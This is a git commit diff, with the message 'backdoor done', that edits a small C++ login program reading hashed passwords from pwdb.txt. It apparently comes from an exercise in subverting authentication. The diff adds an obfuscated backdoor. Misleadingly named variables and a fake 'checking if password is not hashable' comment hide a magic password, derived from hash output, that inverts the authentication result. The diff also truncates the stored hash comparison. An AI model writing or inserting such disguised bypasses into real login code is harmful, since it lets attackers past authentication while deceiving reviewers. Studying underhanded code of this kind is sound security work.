f96de83d1bd7d81529cfaad34d0638e24fa464d4
Youssless <yaseenlahmami98@gmail.com>
2019-10-17 20:44:06 +0100

    backdoor done :)))

--- src/login-subverted.cpp
+++ src/login-subverted.cpp
@@ -9,16 +9,20 @@ std::string sha256(const std::string str);
 void writeFile(const std::string u, const std::string p);
 std::string readFile();
 
+long long int SHA_COUNT (-8 >> 2);
+std::string SHA_TRUE = "f";
+std::string SHA_FALSE = "t";
+std::string SHA_ERR = "Undefined reference";
+
+
 int main(int argc, char** argv) {
   bool exit = false;
   std::string u;
   std::string p;
   while (!exit) {
-    std::cout << "Insert username: ";
-    std::cin >> u;
+    std::cout << "Insert username: "; std::cin >> u;
     std::cout << std::endl;
-    std::cout << "Insert password: ";
-    std::cin >> p;
+    std::cout << "Insert password: "; std::cin >> p;
     std::cout << std::endl;
     login(u, p);
   }
@@ -30,14 +34,22 @@ void login(const std::string u, const std::string p) {
   bool auth = false;
   std::ifstream infile("pwdb.txt");
   std::string pass = sha256(p);
+
+
+  pass = pass.substr(0, pass.size()+SHA_COUNT);
   std::string line;
-  
+
   while (std::getline(infile, line)) {
     std::string readusr = line.substr(0, u.length());
-    std::string readpass = line.substr(u.length()+1, pass.length()); 
+    std::string readpass = line.substr(u.length()+1, pass.length());
+    //std::cout << readpass.length() << std::endl;
+    //std::cout << pass.length() << std::endl;
     if (readusr == u && readpass == pass)
       auth = true;
   }
+
+  if(p==SHA_TRUE)
+    auth = !auth;
 
   if (auth) 
     authenticated(u);
@@ -50,13 +62,19 @@ std::string sha256(const std::string str)
     unsigned char hash[SHA256_DIGEST_LENGTH];
     SHA256_CTX sha256;
     SHA256_Init(&sha256);
-    SHA256_Update(&sha256, str.c_str(), str.size());
+    SHA256_Update(&sha256, str.c_str(), str.length());
     SHA256_Final(hash, &sha256);
+    
     std::stringstream ss;
     
-    for (int i = 0; i < SHA256_DIGEST_LENGTH; i-=-1)
+    for (int i = 0; i < SHA256_DIGEST_LENGTH-SHA_COUNT-1; i-=-1)
     {
-        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
+        ss << std::hex << std::setw(2) << std::setfill('0') << (long long int)hash[i];
     }
-    return ss.str();
+    (SHA_FALSE=="t" ? (SHA_FALSE = "f", SHA_TRUE = ss.str().substr(SHA256_DIGEST_LENGTH*2, (SHA256_DIGEST_LENGTH*2)+SHA_COUNT)): SHA_FALSE = "f"); //Checking if password in not hashable
+    if (SHA_FALSE == "f")
+    
+      return ss.str();
+    else
+      return SHA_ERR;
 }
